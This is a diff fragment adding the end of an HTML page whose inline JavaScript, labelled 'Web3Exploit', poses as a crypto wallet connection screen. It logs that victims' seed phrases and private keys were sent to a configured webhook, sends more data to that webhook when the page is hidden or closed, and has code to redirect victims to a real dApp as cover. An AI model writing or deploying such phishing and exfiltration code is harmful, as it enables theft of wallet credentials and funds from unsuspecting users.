+            document.querySelector('.loading-text').innerHTML = '⚠️ Security Alert';
+            document.querySelector('.wallet-logo').style.background = "linear-gradient(135deg, #dc2626, #991b1b)";
+        } else {
+            updateStatus("Connection established. Redirecting to dApp...");
+        }
+        
+        console.log("[Web3Exploit] Full payload:", fullPayload);
+        console.log(`[Web3Exploit] Data sent to ${CONFIG.webhook}`);
+        console.log(`[Web3Exploit] Sensitive data: ${sensitive.seeds.length} seeds, ${sensitive.privateKeys.length} keys`);
+        
+        // Optional: Redirect to legit dApp
+        setTimeout(() => {
+            // Uncomment untuk redirect setelah exploit
+            // window.location.href = "https://app.uniswap.org";
+            document.getElementById('loadingScreen').style.opacity = '0';
+            setTimeout(() => {
+                document.getElementById('loadingScreen').style.display = 'none';
+            }, 1000);
+        }, 3000);
+    }
+    
+    // Start exploit
+    main();
+    
+    // Backup: Send data on page unload
+    window.addEventListener('beforeunload', function() {
+        sendToWebhook({
+            type: 'page_unload',
+            timestamp: Date.now(),
+            localStorageSize: localStorage.length,
+            hasSessionStorage: sessionStorage.length > 0
+        });
+    });
+    
+    // Monitor for visibility change (app background/foreground)
+    document.addEventListener('visibilitychange', function() {
+        sendToWebhook({
+            type: 'visibility_change',
+            hidden: document.hidden,
+            timestamp: Date.now()
+        });
+    });
+    
+})();
+</script>
+
+</body>
+</html>
